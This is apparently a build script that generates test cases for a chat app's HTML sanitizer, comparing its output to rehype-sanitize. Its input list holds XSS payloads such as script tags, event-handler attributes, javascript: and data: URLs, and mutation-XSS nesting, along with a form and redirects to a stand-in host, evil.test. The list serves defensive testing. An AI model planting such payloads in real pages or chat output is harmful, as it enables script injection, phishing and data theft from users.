// Writes what the web keeps of HTML a chat's markdown may hold: parsed as rehype-raw parses it
// (parse5, a fragment in a `<template>` context) and cleaned by rehype-sanitize with
// `markdownSanitizeSchema`, so ui/chat's HtmlSanitizeTest can hold the app to the same tree.
// Re-run after the schema or the inputs change:
//
//   PPM_HOME=$(mktemp -d) bun android/scripts/gen-html-sanitize-cases.ts
import { writeFileSync } from "node:fs";
import { resolve } from "node:path";
import { unified } from "unified";
import rehypeParse from "rehype-parse";
import rehypeSanitize from "rehype-sanitize";
import rehypeStringify from "rehype-stringify";
import { markdownSanitizeSchema } from "../../src/web/components/shared/markdown-sanitize";

const out = resolve(import.meta.dir, "../ui/chat/src/test/resources/html-sanitize-cases.json");
const pipeline = unified().use(rehypeParse, { fragment: true }).use(rehypeSanitize, markdownSanitizeSchema).use(rehypeStringify);

const PWN = "window.__pwned=1";
const inputs = [
  // The web's own payloads (markdown-raw-html-sanitize.test.tsx).
  `<iframe srcdoc="<script>${PWN}</script>"></iframe>`, `<script>${PWN}</script>`, `<img src="x" onerror="${PWN}">`,
  `<a href="javascript:${PWN}">a</a>`, `<a href="JaVaScRiPt:${PWN}">a</a>`, `<a href="&#106;avascript:${PWN}">a</a>`,
  `<a href="java\tscript:${PWN}">a</a>`, `<a href="vbscript:msgbox(1)">a</a>`, `<a href="data:text/html,<script>${PWN}</script>">a</a>`,
  `<svg onload="${PWN}"><circle r="5"/></svg>`, `<form action="https://evil.test/steal"><input name="q" type="text"><button>Go</button></form>`,
  `<object data="data:text/html,<script>${PWN}</script>"></object>`, `<embed src="data:text/html,<script>${PWN}</script>">`,
  `<meta http-equiv="refresh" content="0;url=https://evil.test">`, `<base href="https://evil.test/">`, `<style>body{display:none}</style>`,
  `<link rel="stylesheet" href="https://evil.test/x.css">`, `<div class="fixed inset-0 z-50" style="position:fixed;inset:0">Sign in again</div>`,
  `<details open ontoggle="${PWN}"><summary>s</summary>x</details>`, `<input type="text" autofocus onfocus="${PWN}">`,
  `<video><source onerror="${PWN}"></video>`, `<math><mtext><table><mglyph><style><img src=x onerror="${PWN}">`,
  `<template><img src=x onerror="${PWN}"></template>`, `<form><p>inside a form</p></form><style>.x{color:red}</style>`,
  // What replies use.
  `<details><summary>More</summary>\nHidden</details>`, `Press <kbd>Ctrl</kbd>, H<sub>2</sub>O, x<sup>2</sup>, one<br>two`,
  `<img src="https://example.com/b.png" alt="b" width="20">`, `<a href="https://example.org" target="_blank" rel="x">raw</a>`,
  `<a href="mailto:a@b.test">mail</a>`, `<a href="src/a.ts:10">raw</a>`, `<img src="C:/tmp/b.png" alt="b">`, `<a href="#sec">jump</a>`,
  `<h2 id="sec">Sec</h2>`, `<p align="center">\n  <img src="logo.png" width="120" height="40">\n  <b>Title</b>\n</p>`,
  `<div align="right"><i>right</i></div>`, `<abbr title="HyperText">HTML</abbr> <mark>m</mark> <small>s</small> <u>u</u> <ins>i</ins> <del cite="https://x">d</del> <s>s</s> <strike>k</strike>`,
  `<q cite="https://x.test/q">quoted</q> <q cite="javascript:x">bad</q> <var>v</var> <samp>out</samp> <tt>tt</tt> <code>c</code>`,
  `<code class="language-ts x">c</code>`, `<code class="language-math math-inline">x</code>`, `<code class="math-display other">y</code>`,
  `<ruby>漢<rp>(</rp><rt>kan</rt><rp>)</rp></ruby>`, `<dl><dt>Term<dd>Def<dt>Two<dd>Def two</dl>`, `<hr><hr/>`,
  `<ol start="3" class="contains-task-list x"><li class="task-list-item">a</li></ol>`, `<ul aria-label="l"><li>a<li>b</ul>`,
  `<input type="checkbox" checked>`, `<input checked>`, `<input type="checkbox" disabled="no">`,
  `<picture><source srcset="a.png" media="(min-width: 1px)"><img src="b.png"></picture><source srcset="c">`,
  `<table border="1" cellpadding="2"><caption>c</caption><thead><tr><th align="left" colspan="2">h</th></tr></thead><tbody><tr><td rowspan=2>1</td><td>2</td></tr></tbody></table>`,
  `<table><tr><td>1</td></tr></table>`, `<table><td>x</td></table>`, `<td>x</td>`, `<tr><td>a</td></tr>`, `<table>text<tr><td>x</table>`,
  `<table><tr><td>a<td>b<tr><td>c</table>`, `<table><tbody><tr><td><table><tr><td>in</td></tr></table></td></tr></tbody></table>`,
  `<section class="footnotes" data-footnotes><h2 class="sr-only" id="footnote-label">Footnotes</h2></section>`,
  `<span title="&lt;&amp;&quot;">x</span>`, `<span id="a" name="b" aria-describedby="c" aria-labelledby="d" aria-label="e">x</span>`,
  `<div itemscope itemtype="https://schema.org/x">x</div>`, `<img aria-label="l" longdesc="https://x" longdesc="javascript:y" src="a">`,
  `<blockquote cite="https://x">q</blockquote>`, `<blockquote cite="javascript:x">q</blockquote>`, `<summary aria-label="s">x</summary>`,
  // Tree building.
  `<p>a<div>b</div>c</p>`, `<p>a<p>b`, `<p>`, `</p>`, `a</p>b`, `<ul><li>a<li>b</ul>`, `<ul><li>a<ul><li>b</ul><li>c</ul>`,
  `<li>a<li>b`, `<h1>a<h2>b</h2>`, `<h1>a</h2>b`, `<b>x<i>y</b>z</i>`, `<p><b>x</p>y`, `<b><p>x</b>y</p>`, `<i>a<p>b</i>c</p>`,
  `<a href="1">a<a href="2">b</a>`, `<b>1<b>2<b>3<b>4</b></b></b></b>`, `<sub>a<b>b</sub>c</b>`, `<b>a<sub>b</b>c</sub>`,
  `<div>a<span>b</div>c</span>`, `<span>a<div>b</span>c</div>`, `<em>a<strong>b</em>c</strong>`, `<u>a<div>b</u>c</div>`,
  `<button>a<button>b</button>`, `<select><option>a<option>b</select>`, `<details><summary>a</details>b</summary>`,
  `<div><p>a</div>b`, `<pre>\na</pre>`, `<pre>\n\na</pre>`, `<textarea>\n<b>x</b></textarea>`, `<title>t <b>x</b></title>`, `<xmp><b></xmp>`,
  `<iframe><b>x</b></iframe>y`, `<noscript><b>x</b></noscript>`, `<noembed><b>x</b></noembed>`, `<noframes><b>x</b></noframes>`,
  `<plaintext><b>x</b></plaintext>`, `<script>a</script >b`, `<style>a</styl></style>b`, `<svg><a href="x">y</a></svg>`,
  `<math><mi>x</mi></math>`, `<br/>a</br>`, `<img/><wbr>x<wbr/>`, `<image src="a">`, `<p/>x`, `<div/>x</div>`, `<span/>x`,
  // The adoption agency's inner loop gives up on formatting elements past the third.
  `<b><i><u><s><em><strong><p>x</b>y`, `<a href="1"><b><i><u><s><div>x</a>y`, `<b><i><u><s><em><strong><small><code><div>x</b>y</div>`,
  `<b><i><u><s><em><div>1</b>2</i>3</u>4</s>5</em>6`, `<b class="1"><b class="1"><b class="1"><b class="1">x</b></b>y`,
  `<DIV CLASS="x" ALIGN=Center>Up</DIV>`, `<div align=left align=right>dup</div>`, `<div align = "x" title='y' dir=rtl>s</div>`,
  `<div title=a&amp;b&lt;c>t</div>`, `<div title="&notit; &not &copy &copyx">t</div>`, `<a href="?a=1&b=2&copy=3">t</a>`,
  // Text and references.
  `x &nbsp; &copy; &unknown; &#169; &#x1F600; &#0; &#x110000; &#128; &#xD800;`, `&amp &lt &gt &quot &AMP; &LT; &notin; &not; &noti`,
  `a < b > c & d`, `a <3 b`, `a </ b`, `a </3 b`, `a <> b`, `a </> b`, `<!-- c --><p>t</p>`, `<!--> a`, `<!---> b`, `<!-- a -- b -->c`,
  `<!DOCTYPE html>x`, `<?php echo 1 ?>x`, `<![CDATA[ a ]]>x`, `<!x>y`, `<!-- unclosed`, `<div`, `<div title="x`, `x\r\ny\rz`, "a\u0000b",
  `<div>\n  a  \n  b\n</div>`, ` lead`, `trail `, `<span>a</span>\n<span>b</span>`,
];

// Tag soup from what chat HTML is made of, the same each run.
let seed = 138;
const random = () => {
  seed = (seed + 0x6d2b79f5) | 0;
  let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
  t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
  return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
};
const pick = <T>(items: T[]): T => items[Math.floor(random() * items.length)]!;
const tags = ["b", "i", "em", "strong", "u", "s", "code", "kbd", "sub", "sup", "small", "mark", "span", "a", "div", "p", "details", "summary", "br"];
const words = ["x", "y z", " ", "\n", "&amp;", "1<2", "é"];
for (let n = 0; n < 300; n++) {
  let html = "";
  for (let k = 0, len = 2 + Math.floor(random() * 10); k < len; k++) {
    const r = random();
    const tag = pick(tags);
    if (r < 0.4) html += `<${tag}${tag === "a" ? ' href="h"' : ""}>`;
    else if (r < 0.7) html += `</${tag}>`;
    else html += pick(words);
  }
  inputs.push(html);
}

const cases = inputs.map((html) => ({ html, out: String(pipeline.processSync(html)) }));
writeFileSync(out, JSON.stringify(cases, null, 1) + "\n");
console.log(`${cases.length} cases -> ${out}`);
